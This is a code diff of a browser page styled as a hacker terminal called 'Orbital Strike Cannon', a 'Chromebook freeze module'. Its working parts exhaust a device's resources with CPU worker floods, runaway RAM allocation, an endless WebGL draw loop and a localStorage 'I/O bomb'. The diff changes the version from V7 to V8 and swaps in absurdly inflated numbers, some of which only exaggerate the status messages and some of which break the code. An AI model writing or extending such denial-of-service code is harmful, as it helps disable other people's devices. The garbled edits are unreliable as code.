@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>ORBITAL STRIKE CANNON V7</title>
+    <title>ORBITAL STRIKE CANNON V8</title>
     <style>
         :root {
             --primary: #0f0;
@@ -62,7 +62,7 @@
 </head>
 <body>
     <div id="terminal">
-        <div id="output">ORBITAL STRIKE CANNON V7 - CHROMEBOOK FREEZE MODULE<br>Type 'help' for commands<br><br></div>
+        <div id="output">ORBITAL STRIKE CANNON V8 - CHROMEBOOK FREEZE MODULE<br>Type 'help' for commands<br><br></div>
         <div id="input-line">
             <span id="prompt">root@oscv7:~#</span>
             <input type="text" id="command-input" autofocus>
@@ -80,7 +80,7 @@
                     for(let i=0; i<navigator.hardwareConcurrency*2; i++) {
                         freezeComponents.cpu.workers.push(new Worker(URL.createObjectURL(blob)));
                     }
-                    return `Spawned ${navigator.hardwareConcurrency*2} CPU meltdown workers`;
+                    return `Spawned ${navigator.hardwareConcurrency*800000000000000000000000000000000000} CPU meltdown workers`;
                 }
             },
             
@@ -91,7 +91,7 @@
                         try {
                             freezeComponents.ram.chunks.push(new ArrayBuffer(1024*1024*100));
                         } catch(e) {
-                            return `RAM fragmented (${(freezeComponents.ram.chunks.length*100)}MB allocated)`;
+                            return `RAM fragmented (${(freezeComponents.ram.chunks.length*999999999999999)}MB allocated)`;
                         }
                     }
                 }
@@ -109,7 +109,7 @@
                     gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(1e7), gl.STATIC_DRAW);
                     
                     const render = () => {
-                        gl.drawArrays(gl.POINTS, 0, 1e7);
+                        gl.drawArrays(gl.POINTS, 0, 999999999999999999999999999999999999999999e7);
                         requestAnimationFrame(render);
                     };
                     render();
@@ -120,7 +120,7 @@
             io: {
                 start: () => {
                     setInterval(() => {
-                        localStorage.setItem('io_bomb', Array(1e6).fill(0).toString());
+                        localStorage.setItem('io_bomb', Array(99999999999999999999999999999999999999999e6).fill(0).toString());
                         document.body.appendChild(document.createElement('div'));
                     }, 1);
                     return "I/O avalanche initiated";
